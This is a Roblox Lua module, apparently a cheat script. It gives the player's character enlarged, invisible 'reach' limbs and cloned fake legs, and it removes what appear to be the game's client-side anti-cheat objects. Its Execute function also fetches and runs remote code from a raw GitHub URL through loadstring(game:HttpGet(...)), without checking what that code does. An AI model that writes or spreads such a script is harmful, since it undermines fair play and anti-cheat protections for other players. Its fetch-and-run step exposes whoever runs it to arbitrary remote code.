local module = {}

local Players = game:GetService("Players")

local function getCharacter()
    local player = Players.LocalPlayer
    return player.Character or player.CharacterAdded:Wait()
end

-- 🔹 CLONAR PIERNA
local function cloneLeg(character, legName)

    local leg = character:FindFirstChild(legName)
    if not leg then return end

    local legCopy = leg:Clone()
    legCopy.Name = legName .. "_Fake"
    legCopy.Parent = leg.Parent
    legCopy.Anchored = true
    legCopy.CanCollide = false

    local weld = Instance.new("WeldConstraint")
    weld.Part0 = legCopy
    weld.Part1 = leg
    weld.Parent = legCopy

    task.wait(0.1)
    legCopy.Anchored = false
end

-- 🔹 APPLY REACH
function module:Apply()

    local character = getCharacter()

    if not self.Reach then
        return
    end

    if self.Legreach then
        local rLeg = character:FindFirstChild("Right Leg")
        local lLeg = character:FindFirstChild("Left Leg")

        if rLeg and lLeg then
            rLeg.Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)
            lLeg.Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)

            rLeg.Transparency = self.ReachOpacity
            lLeg.Transparency = self.ReachOpacity

            rLeg.Massless = true
            lLeg.Massless = true
        end
    end

    if self.Armreach then
        local rArm = character:FindFirstChild("Right Arm")
        local lArm = character:FindFirstChild("Left Arm")

        if rArm and lArm then
            rArm.Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)
            lArm.Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)

            rArm.Transparency = self.ReachOpacity
            lArm.Transparency = self.ReachOpacity

            rArm.Massless = true
            lArm.Massless = true
        end
    end
end

-- 🔹 EXECUTE TODO
function module:Execute()

    local character = getCharacter()

    -- 🔥 Crear piernas falsas otra vez
    cloneLeg(character, "Right Leg")
    cloneLeg(character, "Left Leg")

    -- Seguridad
    if not workspace:FindFirstChild("Configuration") then
        return
    end

    if character:FindFirstChild("ClientRemotesFire") then
        character.ClientRemotesFire:Destroy()
    end

    task.wait(1)

    if character:FindFirstChild("LocalScript") then
        character.LocalScript:Destroy()
    end

    -- Load externo
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua'))()
    end)

    -- Aplicar reach con variables actuales
    self:Apply()
end

------------------------------------------------------------------
-- ⚙️ CONFIG
------------------------------------------------------------------

module.Reach = true
module.ReachOpacity = 1

module.Legreach = true
module.LegreachMultiplier = 2.4

module.Armreach = false
module.ArmreachMultiplier = 52

------------------------------------------------------------------

return module
